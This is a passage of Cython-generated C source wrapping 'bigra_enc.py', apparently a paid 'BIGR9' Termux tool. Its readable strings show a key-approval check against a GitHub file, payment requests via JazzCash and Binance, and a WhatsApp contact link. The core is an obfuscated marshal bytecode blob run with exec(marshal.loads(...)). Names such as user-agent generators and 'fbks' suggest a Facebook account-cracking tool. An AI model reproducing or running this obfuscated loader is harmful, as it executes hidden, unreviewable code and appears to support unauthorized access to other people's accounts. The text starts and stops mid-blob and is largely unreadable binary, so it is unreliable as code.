x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00d\x16|\x01z\x00\x00\x00}\x04t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17|\x04z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t!\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x18NrV\x00\x00\x00z<https://github.com/monsterrulex/BIGRA/blob/main/Approval.txtr\x89\x00\x00\x00z$\t \x1b[1;32m FIRST GET APPROVAL\x1b[1;37m rR\x00\x00\x00z& YOU NEED TO GET APPROVED FIRST\x1b[1;37mz$ Key not approved contact with adminz\' \x1b[37;41m\t WELCOME TO BIGR9\x1a TOOL \x1b[0;mu-\x00\x00\x00[\xe2\x88\x9a]FREE WALY DOOR RAHO FREE KEY NI MILY GI z<\x1b[1;37m ====================================================z\x1e[A]Contact with me on WhatsAppz\x1e[B]Contact with me on Facebooku/\x00\x00\x00[\xe2\x88\x9a]SEND 450 PKR(OR) 5$ (FOR 15 DAYS APPROVEL)u\x18\x00\x00\x00[\xe2\x88\x9a]JAZZCASH + BINANCE u\'\x00\x00\x00[\xe2\x88\x9a]FOR OTHER COUNTRY BINANCE ACCOUNT u\x1e\x00\x00\x00 \xc3\x97Your Key is Not Approved \xc3\x97u"\x00\x00\x00 \xe2\x88\x9aCOPY AND SEND ME IN WHATSAPP \x1az$ \x1b[1;37m\x1a\x1aYour Key\x1a\x1a : \x1b[1;36mBIGR9\x1az\x11 PUT YOUR NAME : z\x1a \x1aPRESS ENTER TO SEND KEY\x1ag\x00\x00\x00\x00\x00\x00\x0c@z\x08MR-BIGR9z\xd5am start https://wa.me/+923196101378?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*BIGR9\x1a*%20*PAID*%20*TOOL*%20*APPROVAL*%20/%20%20*MY*%20/%20%20*NAME*%20/%20%20*IS*%20/%20%20*+nameMy*%20*Key*%20*:*%20)\x11r\x1f\x00\x00\x00r\x8a\x00\x00\x00\xda\x07geteuid\xda\x08getloginr\xec\x01\x00\x00r\xd8\x00\x00\x00\xda\x03get\xda\x04textr\xcc\x00\x00\x00r\x8b\x00\x00\x00r\x8c\x00\x00\x00r\x8d\x00\x00\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00r\x90\x00\x00\x00r\xc5\x00\x00\x00\xda\tsuperuser)\x05r\xf0\x01\x00\x00\xda\x02id\xda\x04DARKr\xf4\x00\x00\x00\xda\x03tkss\x05\x00\x00\x00     r(\x00\x00\x00r0\x02\x00\x00r0\x02\x00\x00*\x02\x00\x00sn\x01\x00\x00\x80\x00\xdc\x0b\x0e\x8cr\x8fz\x89z\x8b|\xd3\x0b\x1c\x9cs\xa42\xa7;\xa1;\xa3=\xd3\x1f1\xd1\x0b1\x80D\xd8\t\x0c\x8f\x18\x89\x18\x90$\x8b\x1e\x80B\xdc\t\x11\x8f\x1c\x89\x1c\xd0\x16T\xd3\tU\xd7\tZ\xd1\tZ\x80D\xd8\x07\t\x88T\x81z\xdc\x08\x0c\x8d\x06\xe4\x08\n\x8f\t\x89\t\x90\'\xd4\x08\x1a\xdc\x08\r\x8cd\x8c\x0b\xdc\x08\r\xd0\x0e;\xd4\x08<\xdc\x08\x0c\x8f\n\x89\n\x901\x8c\r\xdc\x08\n\x8f\t\x89\t\x90\'\xd4\x08\x1a\xdc\x08\r\x8cd\x8c\x0b\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0e9\xd4\x08:\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x104\xd4\x086\xdc\x08\r\xd0\x0f=\xd4\x08>\xdc\x08\r\xd0\x10=\xd4\x08?\xdc\x08\r\xd0\x0eN\xd4\x08O\xdc\x08\r\xd0\x10.\xd4\x080\xdc\x08\r\xd0\x10.\xd4\x080\xdc\x08\r\xd0\x10?\xd4\x08A\xdc\x08\r\xd0\x10(\xd4\x08*\xdc\x08\r\xd0\x107\xd4\x089\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0e.\xd4\x08/\xdc\x08\r\xd0\x0e2\xd4\x083\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0f@\xc0\x12\xd1\x0fC\xd4\x08D\xc4T\xc4V\xdc\x0f\x14\xd0\x15(\xd3\x0f)\x88\x04\xdc\x08\r\xd0\x0e*\xd4\x08+\xacD\xacF\xdc\x08\x0c\x8f\n\x89\n\x903\x8c\x0f\xd8\x0e\x1b\x98B\xd1\x0e\x1e\x88\x03\xdc\x08\n\x8f\t\x89\t\xf0\x00\x00\x13j\x03\xf0\x00\x00m\x03p\x03\xf1\x00\x00\x13p\x03\xf4\x00\x00\tq\x03\xdc\x08\x11\x8d\x0br*\x00\x00\x00)Rr\x8a\x00\x00\x00rn\x01\x00\x00r\xca\x00\x00\x00\xda\x04zlib\xda\x0cPyInit_BIGR9r\xe2\x01\x00\x00r\x8c\x00\x00\x00r\x8b\x00\x00\x00\xda\x02rer#\x02\x00\x00r\xf0\x01\x00\x00r\xee\x01\x00\x00r\xd8\x00\x00\x00r\x1d\x00\x00\x00\xda\nsubprocess\xda\x08platform\xda\x12concurrent.futuresr\x04\x00\x00\x00r\xd1\x00\x00\x00\xda\x13ModuleNotFoundErrorr\xdb\x00\x00\x00r\xd6\x00\x00\x00r\xd7\x00\x00\x00r\xe5\x01\x00\x00\xda\x03apkr\xf1\x01\x00\x00\xda\x03hex\xda\x05upper\xda\x04myidr)\x00\x00\x00r0\x00\x00\x00\xda\x04ugenr\xce\x00\x00\x00\xda\x05agent\xda\x02aar\x1e\x00\x00\x00\xda\x01b\xda\x01c\xda\x01dr!\x00\x00\x00r&\x00\x00\x00\xda\x01f\xda\x01g\xda\x01hr\xe3\x00\x00\x00\xda\x01jrY\x01\x00\x00\xda\x01l\xda\x08fullagntr\xcf\x00\x00\x00\xda\x04fbks\xda\x07samsungr\xea\x01\x00\x00\xda\x0ccheck_outputr&\x02\x00\x00r\xe7\x01\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r\xd2\x00\x00\x00r$\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00\xda\x05total\xda\x06selectr\xf4\x01\x00\x00r\xe9\x01\x00\x00r\x89\x00\x00\x00r\x8d\x00\x00\x00r\x90\x00\x00\x00r\xd0\x00\x00\x00\xda\x02ckr\xb9\x00\x00\x00r\xcc\x00\x00\x00r\xd5\x00\x00\x00r\xd4\x00\x00\x00r0\x02\x00\x00r\x8e\x00\x00\x00r*\x00\x00\x00r(\x00\x00\x00\xda\x08<module>rQ\x02\x00\x00\x01\x00\x00\x00s\x0f\x06\x00\x00\xf0\x03\x01\x01\x01\xf7\x06\x00\x01\x0f\xdf\x00\x13\xd3\x00\x13\xdb\x00\x13\xdb\x00\n\xd9\x00\x05\xd0\x06/\xd4\x000\xd8\x00\t\x80\x02\x87\t\x81\t\xd0\nE\xd4\x00F\xf0\x02\x07\x01\x08\xdf\x01E\xd7\x01E\xd7\x01E\xd7\x01E\xd3\x01E\xdc\x01\x15\xdd\x01:\xf0\n\x00\x12\x14\x90B\x90q\x98\x12\x90\x1a\xd1\x00\x10\x80\x03\x80C\x88\x04\x88S\xd8\x05\x0f\x80T\x87Z\x81Z\x83\\\xd7\x05\x15\xd1\x05\x15\x90b\x90q\xd0\x05\x19\xd7\x05\x1f\xd1\x05\x1f\xd3\x05!\x80\x04\xf2\x04\x07\x01\x0e\xf2\x12\x05\x01\x13\xf0\x10\x00\x06\x08\x80\x04\xd9\r\x12\x904\x8e[\x80E\xd8\x0b)\x88\x02\xd8\n\x17\x88&\x8f-\x89-\xd2\x188\xd3\n9\x88\x01\xd8\n+\x88\x01\xd8\n\x17\x88&\x8f-\x89-\xf2\x00\x00\x19Z\x02\xf3\x00\x00\x0b[\x02\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x981\x98c\xd3\n"\x88\x01\xd8\n\x17\x88&\x8f-\x89-\xf2\x00\x00\x19Z\x02\xf3\x00\x00\x0b[\x02\x88\x01\xd8\nR\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x982\x98b\xd3\n!\x88\x01\xd8\n\r\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x984\xa0\x04\xd3\n%\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x982\x98c\xd3\n"\x88\x01\xd8\n \x88\x01\xd8\x15\x17\x90D\x98\x01\x98!\x98\x13\x98B\x98q\x98c\xa0!\xa0\x13\xa0Q\xa0C\xa8\x01\xa0s\xa8"\xa8Q\xa8C\xb0\x01\xa8s\xb0!\xb0A\xb03\xb0a\xb8\x01\xb0s\xb8!\xb8A\xb83\xb8a\xc0\x01\xb8s\xd0\x12C\x88\x08\xd8\x08\x0c\x8f\x0b\x89\x0b\x90H\xd5\x08\x1d\xf0\x1d\x00\x0e\x19\xf0 \x00\x06t\x01\x80\x04\xf2\x02\x00\x0bG,\x80\x07\xd8\t\x0b\x80\x06\xd8\x12)\x90*\xd7\x12)\xd1\x12)\xd0*L\xd0SW\xd4\x12X\xd7\x12_\xd1\x12_\xd0`g\xd3\x12h\xd7\x12p\xd1\x12p\xd0qu\xd0vx\xd3\x12y\x80\x0f\xd8\x08\x1f\x88\n\xd7\x08\x1f\xd1\x08\x1f\xd0 :\xc0\x14\xd4\x08F\xd7\x08M\xd1\x08M\xc8g\xd3\x08V\xd7\x08^\xd1\x08^\xd0_c\xd0df\xd3\x08g\x80\x05\xd8\x08\x1f\x88\n\xd7\x08\x1f\xd1\x08\x1f\xd0 5\xb8D\xd4\x08A\xd7\x08H\xd1\x08H\xc8\x17\xd3\x08Q\xd7\x08Y\xd1\x08Y\xd0Z^\xd0_a\xd3\x08b\x80\x05\xd8\x07\x0e\x80\x04\xf0\x02\x03\x01\x18\xd8\x0f&\x88z\xd7\x0f&\xd1\x0f&\xd0\'C\xc8$\xd4\x0fO\xd7\x0fV\xd1\x0fV\xd0W^\xd3\x0f_\xd7\x0fe\xd1\x0fe\xd0fi\xd3\x0fj\xd0kl\xd1\x0fm\xd7\x0fu\xd1\x0fu\xd0vz\xd0{}\xd3\x0f~\x88\x04\xf0\x06\x00\x08\x1f\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f@\xc0t\xd4\x07L\xd7\x07S\xd1\x07S\xd0T[\xd3\x07\\\xd7\x07d\xd1\x07d\xd0ei\xd0jl\xd3\x07m\x80\x04\xd8\x07\x1e\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f9\xc0\x04\xd4\x07E\xd7\x07L\xd1\x07L\xc8W\xd3\x07U\xd7\x07]\xd1\x07]\xd0^b\xd0ce\xd3\x07f\x80\x04\xd8\x07\x0c\x80\x04\xd8\x07\x16\x80\x04\xd8\x07\x1e\x80z\xd7\x07\x1e\xd1\x07\x1e\xd0\x1f?\xc0d\xd4\x07K\xd7\x07R\xd1\x07R\xd0SZ\xd3\x07[\xd7\x07c\xd1\x07c\xd0dg\xd0hk\xd3\x07l\xd7\x07t\xd1\x07t\xd0uy\xd0z|\xd3\x07}\x80\x04\xd8\x07\x1e\xd0\x1f6\x98z\xd7\x1f6\xd1\x1f6\xd07`\xd0gk\xd4\x1fl\xd7\x1fs\xd1\x1fs\xd0t{\xd3\x1f|\xf7\x00\x00 E\x02\xf1\x00\x00 E\x02\xf0\x00\x00F\x02J\x02\xf0\x00\x00K\x02M\x02\xf3\x00\x00 N\x02\xf1\x00\x00\x08N\x02\xf0\x00\x00O\x02X\x02\xf1\x00\x00\x08X\x02\xf0\x00\x00Y\x02p\x02\xf0\x00\x00Y\x02c\x02\xf7\x00\x00Y\x02p\x02\xf1\x00\x00Y\x02p\x02\xf0\x00\x00q\x02Y\x03\xf0\x00\x00`\x03d\x03\xf4\x00\x00Y\x02e\x03\xf7\x00\x00Y\x02l\x03\xf1\x00\x00Y\x02l\x03\xf0\x00\x00m\x03t\x03\xf3\x00\x00Y\x02u\x03\xf7\x00\x00Y\x02}\x03\xf1\x00\x00Y\x02}\x03\xf0\x00\x00~\x03B\x04\xf0\x00\x00C\x04E\x04\xf3\x00\x00Y\x02F\x04\xf1\x00\x00\x08F\x04\x80\x04\xf0\x02\x14\x01\x18\xd8\x0f&\x88z\xd7\x0f&\xd1\x0f&\xd0\'C\xc8$\xd4\x0fO\xd7\x0fV\xd1\x0fV\xd0W^\xd3\x0f_\xd7\x0fe\xd1\x0fe\xd0fi\xd3\x0fj\x88\x04\xd8\x10\x11\x88\x05\xdb\x11\x15\x88A\xd8\x10\x15\x90q\x91\x08\x91\x05\xf0\x03\x00\x12\x16\xe0\x11\x1a\x88\x06\xd8\x0b\x11\x90S\x8a=\xd8\x17.\x90z\xd7\x17.\xd1\x17.\xd0/K\xd0RV\xd4\x17W\xd7\x17^\xd1\x17^\xd0_f\xd3\x17g\xd7\x17m\xd1\x17m\xd0nq\xd3\x17r\xd0st\xd1\x17u\xd7\x17}\xd1\x17}\xf0\x00\x00\x7f\x01C\x02\xf0\x00\x00D\x02F\x02\xf3\x00\x00\x18G\x02\x90\x04\xdc\x10\x16\x98\x04\x91\x0c\x91\x06\xd8\r\x13\x90s\x8a]\xf0\x02\x05\x11%\xd8\x1f6\x98z\xd7\x1f6\xd1\x1f6\xd07S\xd0Z^\xd4\x1f_\xd7\x1ff\xd1\x1ff\xd0gn\xd3\x1fo\xd7\x1fu\xd1\x1fu\xd0vy\xd3\x1fz\xd0{|\xd1\x1f}\xf7\x00\x00 F\x02\xf1\x00\x00 F\x02\xf0\x00\x00G\x02K\x02\xf0\x00\x00L\x02N\x02\xf3\x00\x00 O\x02\x98\x04\xdc\x18\x1e\xa0\x04\x99\x0c\x99\x06\xf0\n\x00\x18 \x90\x04\xdc\x10\x16\x98\x04\x91\x0c\x90\x06\xf0\x08\x00\x1b*\xd8\x10\x15\xd8\x10\x15\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x14\xd8\x0f\x13\xd8\x0f\x13\xd8\x0f\x13\xf1\x15\n\n\x15\x80\x06\xf2\x16\x02\x01\x10\xf0\x06\x0c\x07?\x80\x04\xf2\x1e\x01\x01U\x01\xf0\x06\x00\x06\x07\x80\x04\xd8\x04\x06\x80\x03\xd8\x04\x06\x80\x03\xd8\x04\x06\x80\x03\xd8\x03\x05\x80\x02\xf2\x06\x1d\x01\x10\xf2@\x01G\x01\x01\x17\xf2P\x02L\x02\x01\x15\xf2Z\x04L\x02\x01\x15\xf2Z\x04$\x01\r\xf2J\x01#\x01\x14\xf1H\x01\x00\x01\n\x85\x0b\xf8\xf0C\x12\x00\x08\x1b\xf2\x00\x03\x01\x08\xd9\x01\x06\xd0\x07/\xd4\x010\xd8\x01\n\x80\x12\x87\x19\x81\x19\xd0\x0bF\xd4\x01G\xd9\x01\x05\x87\x16\xf0\x07\x03\x01\x08\xfb\xf0d\x01\x01\x01\x18\xd8\x0f\x17\x8b\x04\xfb\xf0(\x00\x18!\xf2\x00\x02\x11%\xd8\x1f\'\x98\x04\xdc\x18\x1e\xa0\x04\x99\x0c\x9d\x06\xfb\xf0\x05\x02\x11%\xfb\xf0\x0c\x01\x01\x18\xd8\x0f\x17\x8a\x04\xfasV\x00\x00\x00\xb8/R*\x00\xc8\x1bA\x05S\x17\x00\xcd;B\x1bS>\x00\xd0\x17A\x0eS!\x00\xd1%\x0cS>\x00\xd2*&S\x14\x03\xd3\x13\x01S\x14\x03\xd3\x17\x04S\x1e\x03\xd3!\x05S;\x03\xd3&\x0bS6\x03\xd31\x05S>\x00\xd36\x05S;\x03\xd3;\x03S>\x00\xd3>\x04T\x04\x03'))
*/
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_marshal, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_marshal, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "bigra_enc.py":5
 * 
 * import marshal
 * exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\xf3\x0e\n\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x00Z\x00d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05\x02\x00e\x06d\x02\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\t\x00d\x00d\x01l\x08Z\x08d\x00d\x01l\tZ\td\x00d\x01l\nZ\nd\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x05Z\x05d\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x04l\x0b\xad\x02\x01\x00d\x00d\x05l\x10m\x11Z\x12\x01\x00g\x00g\x00d\x00g\x00f\x04\\\x04\x00\x00a\x15a\x16a\x17Z\x18\x02\x00e\nj2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00j4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x07\x1a\x00j7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00Z\x1cd\x08\x84\x00Z\x1dd\t\x84\x00Z\x1eg\x00Z\x1f\x02\x00e d\n\xab\x01\x00\x00\x00\x00\x00\x00D\x00]\xc6\x00\x00Z!d\x0bZ"\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0c\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z$d\rZ%\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0e\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z&\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0fd\x10\xab\x02\x00\x00\x00\x00\x00\x00Z(\x02\x00e\rjF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x0e\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00Z)d\x11Z*\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12d\x13\xab\x02\x00\x00\x00\x00\x00\x00Z+d\x14Z,\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15d\x16\xab\x02\x00\x00\x00\x00\x00\x00Z-\x02\x00e\rjN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17d\x18\xab\x02\x00\x00\x00\x00\x00\x00Z.d\x19Z/e"\x9b\x00d\x1ae$\x9b\x00d\x1be%\x9b\x00e&\x9b\x00e(\x9b\x00e)\x9b\x00d\x1ce*\x9b\x00e+\x9b\x00d\x1de,\x9b\x00d\x1de-\x9b\x00d\x1de.\x9b\x00d\x1ae/\x9b\x00\x9d\x13Z0e\x1fjc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e0\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x8c\xc8\x04\x00d\x1eZ2g\x00d\x1f\xa2\x01Z3d a4\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d!d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z8\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d&d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z9\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\'d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z:d(Z;\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x00\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d,d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z>\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d-d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z?e9Z@e8ZA\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d.d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*d/\xab\x02\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00ZBd0\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d1d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00z\x00\x00\x00d2z\x00\x00\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d3d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00z\x00\x00\x00ZC\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00Z=d\x00ZDe=D\x00]\x07\x00\x00Z,eDd\x0fz\r\x00\x00ZD\x8c\t\x04\x00d4ZEeEd5k(\x00\x00rO\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x00\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4n`eEd6k(\x00\x00rP\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x0f\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4n\x0bd7Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4e8e9e:e;e>e?e9eAeBeCd8\x9c\nZGd9\x84\x00ZHd:ZId;\x84\x00ZJd\x00a\x17g\x00a\x15g\x00a\x16g\x00ZKg\x00ZLd<\x84\x00ZMd=\x84\x00ZNd>\x84\x00ZOd?\x84\x00ZPd@\x84\x00ZOdA\x84\x00ZQ\x02\x00eQ\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x01#\x00e\x13$\x00r%\x01\x00\x02\x00e\x06d\x06\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x14\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00\x90\x04\x8clw\x00x\x03Y\x00w\x01#\x00\x01\x00d+Z=Y\x00\x90\x02\x8c~x\x03Y\x00w\x01#\x00eF$\x00r\x15Z(d+Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4Y\x00d\x01Z([(\x8c\x85d\x01Z([(w\x01w\x00x\x03Y\x00w\x01#\x00\x01\x00d+Z=Y\x00\x8c\x93x\x03Y\x00w\x01)B\xe9\x00\x00\x00\x00Nz#\x1b[1;37\x1b[1m Join our WhatsApp group z9xdg-open 